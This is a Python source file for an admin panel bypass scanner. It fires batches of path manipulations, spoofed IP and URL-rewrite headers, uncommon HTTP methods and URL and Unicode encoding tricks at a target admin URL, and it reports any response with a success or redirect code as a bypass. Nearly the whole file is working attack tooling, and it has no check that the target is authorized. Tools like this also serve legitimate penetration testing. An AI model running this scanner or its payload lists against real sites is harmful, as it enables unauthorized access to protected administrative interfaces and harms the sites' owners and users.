"""Admin panel bypass scanner - Tests 50+ path manipulation, header, method, and encoding techniques."""

import httpx
from urllib.parse import urlparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any


class AdminBypass:
    """Scanner for bypassing admin panel access restrictions."""

    def __init__(self, threads: int = 10, timeout: int = 10, follow_redirects: bool = False):
        """
        Initialize AdminBypass scanner.

        Args:
            threads: Number of concurrent threads for scanning.
            timeout: HTTP request timeout in seconds.
            follow_redirects: Whether to follow HTTP redirects.
        """
        self.threads = threads
        self.timeout = timeout
        self.follow_redirects = follow_redirects
        self.findings: List[Dict[str, Any]] = []
        self.success_codes = [200, 201, 202, 301, 302, 307, 308]

    def scan(self, url: str) -> List[Dict[str, Any]]:
        """
        Run all bypass techniques against the target URL.

        Args:
            url: Target admin URL to bypass (e.g., http://target.com/admin).

        Returns:
            List of findings with technique, status_code, bypass_url, and evidence.
        """
        self.findings = []
        print(f"[*] Starting admin bypass scan on: {url}")

        techniques = [
            ("Path Bypass", self.path_bypass),
            ("Header Bypass", self.header_bypass),
            ("Method Bypass", self.method_bypass),
            ("Encoding Bypass", self.encoding_bypass),
        ]

        for name, func in techniques:
            print(f"[*] Running: {name}")
            try:
                results = func(url)
                self.findings.extend(results)
            except Exception as e:
                print(f"[-] Error in {name}: {e}")

        print(f"[+] Scan complete. Found {len(self.findings)} potential bypasses.")
        return self.findings

    def path_bypass(self, url: str) -> List[Dict[str, Any]]:
        """
        Test 50+ path manipulation techniques for admin bypass.

        Args:
            url: Target URL to test path manipulations against.

        Returns:
            List of successful bypass findings.
        """
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path.rstrip("/")
        path_name = path.split("/")[-1] if path else "admin"

        # Generate 50+ path variations
        path_variations = [
            f"{path}/",
            f"{path}//",
            f"{path}/./",
            f"{path}/../{path_name}",
            f"{path}..;/",
            f"{path};/",
            f"{path}/.;/",
            f"{path}/..;/",
            f"{path}%20",
            f"{path}%09",
            f"{path}%00",
            f"{path}.html",
            f"{path}.php",
            f"{path}.json",
            f"{path}.xml",
            f"{path}?",
            f"{path}??",
            f"{path}#",
            f"{path}/*",
            f"{path}/.",
            f"{path}/~",
            f"/{path_name.upper()}",
            f"/{path_name.capitalize()}",
            f"/{path_name}..;/",
            f"/;/{path_name}",
            f"/.;/{path_name}",
            f"//;/{path_name}",
            f"/{path_name};.css",
            f"/{path_name};.js",
            f"/{path_name};.png",
            f"/{path_name}..;..;/",
            f"/{path_name}/./",
            f"/{path_name}/../{path_name}",
            f"/{path_name}%2f",
            f"/{path_name}%2f/",
            f"/%2e/{path_name}",
            f"/{path_name}%20/",
            f"/{path_name}%09/",
            f"/{path_name}.%00.json",
            f"/{path_name}..%00/",
            f"/{path_name}..%0d/",
            f"/{path_name}..%5c/",
            f"/{path_name}..%ff/",
            f"/{path_name}..%0a/",
            f"/{path_name}..%250a/",
            f"/%61%64%6d%69%6e",  # 'admin' URL encoded
            f"/{path_name}///",
            f"/{path_name}/..%252f..%252f",
            f"/{path_name}/.%2e/",
            f"/{path_name}/%2e%2e/",
            f"/!{path_name}",
            f"/{path_name}!",
            f"/{path_name}~",
            f"/{path_name}.asp",
            f"/{path_name}.aspx",
            f"/{path_name}....//",
        ]

        results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for variation in path_variations:
                test_url = base + variation
                future = executor.submit(self._make_request, test_url)
                futures[future] = (variation, test_url)

            for future in as_completed(futures):
                variation, test_url = futures[future]
                try:
                    response = future.result()
                    if response and response.status_code in self.success_codes:
                        results.append({
                            "technique": f"Path Bypass: {variation}",
                            "status_code": response.status_code,
                            "bypass_url": test_url,
                            "evidence": f"Response length: {len(response.content)} bytes",
                        })
                except Exception:
                    pass

        return results

    def header_bypass(self, url: str) -> List[Dict[str, Any]]:
        """
        Test 20+ HTTP headers for admin access bypass.

        Args:
            url: Target URL to test header bypasses against.

        Returns:
            List of successful bypass findings.
        """
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-For": "10.0.0.1"},
            {"X-Forwarded-For": "172.16.0.1"},
            {"X-Forwarded-For": "192.168.1.1"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Host": "localhost"},
            {"X-Forwarded-Host": "localhost"},
            {"X-ProxyUser-Ip": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"Cluster-Client-IP": "127.0.0.1"},
            {"X-Original-Method": "GET"},
            {"X-HTTP-Method-Override": "GET"},
            {"X-Method-Override": "GET"},
            {"X-Forwarded-Proto": "https"},
            {"X-Forwarded-Scheme": "https"},
            {"X-WAP-Profile": "http://127.0.0.1/wap.xml"},
            {"Referer": url},
            {"X-Requested-With": "XMLHttpRequest"},
            {"Content-Length": "0"},
        ]

        results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for headers in bypass_headers:
                future = executor.submit(self._make_request, url, headers=headers)
                futures[future] = headers

            for future in as_completed(futures):
                headers = futures[future]
                try:
                    response = future.result()
                    if response and response.status_code in self.success_codes:
                        header_name = list(headers.keys())[0]
                        header_value = list(headers.values())[0]
                        results.append({
                            "technique": f"Header Bypass: {header_name}: {header_value}",
                            "status_code": response.status_code,
                            "bypass_url": url,
                            "evidence": f"Header {header_name}={header_value}, Response length: {len(response.content)} bytes",
                        })
                except Exception:
                    pass

        return results

    def method_bypass(self, url: str) -> List[Dict[str, Any]]:
        """
        Test all HTTP methods for admin access bypass.

        Args:
            url: Target URL to test method bypasses against.

        Returns:
            List of successful bypass findings.
        """
        methods = [
            "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS",
            "HEAD", "TRACE", "CONNECT", "PROPFIND", "PROPPATCH",
            "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK", "SEARCH",
            "PURGE", "LINK", "UNLINK",
        ]

        results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for method in methods:
                future = executor.submit(self._make_request, url, method=method)
                futures[future] = method

            for future in as_completed(futures):
                method = futures[future]
                try:
                    response = future.result()
                    if response and response.status_code in self.success_codes:
                        results.append({
                            "technique": f"Method Bypass: {method}",
                            "status_code": response.status_code,
                            "bypass_url": url,
                            "evidence": f"HTTP Method {method} returned {response.status_code}, length: {len(response.content)} bytes",
                        })
                except Exception:
                    pass

        return results

    def encoding_bypass(self, url: str) -> List[Dict[str, Any]]:
        """
        Test URL encoding, double encoding, and unicode bypass techniques.

        Args:
            url: Target URL to test encoding bypasses against.

        Returns:
            List of successful bypass findings.
        """
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path.rstrip("/")
        path_name = path.split("/")[-1] if path else "admin"

        # Single URL encoding
        single_encoded = quote(f"/{path_name}", safe="")
        # Double URL encoding
        double_encoded = quote(quote(f"/{path_name}", safe=""), safe="")
        # Unicode encoding variations
        unicode_variations = [
            f"/{path_name}".replace("a", "%C0%A1").replace("d", "%C0%E4"),
            f"/%u0061%u0064%u006D%u0069%u006E",  # Unicode admin
            f"/{path_name}".replace("a", "\u0061"),
        ]

        encoding_paths = [
            single_encoded,
            double_encoded,
            f"/{quote(path_name, safe='')}",
            f"/{quote(quote(path_name, safe=''), safe='')}",
            f"/%2561%2564%256d%2569%256e",  # Double encoded 'admin'
            f"/{path_name}".replace("/", "%2f"),
            f"/{path_name}".replace("/", "%252f"),
            f"/{path_name}".replace("/", "%c0%af"),
            f"/{path_name}".replace("/", "%e0%80%af"),
            f"/{path_name}".replace("/", "%c0%2f"),
            f"/{path_name}".replace("/", "%%32%66"),
            f"/{path_name}".replace("/", "%25%32%66"),
            *unicode_variations,
        ]

        results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for enc_path in encoding_paths:
                test_url = base + enc_path
                future = executor.submit(self._make_request, test_url)
                futures[future] = (enc_path, test_url)

            for future in as_completed(futures):
                enc_path, test_url = futures[future]
                try:
                    response = future.result()
                    if response and response.status_code in self.success_codes:
                        results.append({
                            "technique": f"Encoding Bypass: {enc_path}",
                            "status_code": response.status_code,
                            "bypass_url": test_url,
                            "evidence": f"Encoded path accepted, Response length: {len(response.content)} bytes",
                        })
                except Exception:
                    pass

        return results

    def _make_request(
        self, url: str, method: str = "GET", headers: Dict[str, str] = None
    ) -> httpx.Response:
        """
        Make an HTTP request with error handling.

        Args:
            url: URL to request.
            method: HTTP method to use.
            headers: Optional headers to include.

        Returns:
            httpx.Response object or None on failure.
        """
        try:
            with httpx.Client(
                timeout=self.timeout,
                follow_redirects=self.follow_redirects,
                verify=False,
            ) as client:
                response = client.request(method, url, headers=headers or {})
                return response
        except Exception:
            return None
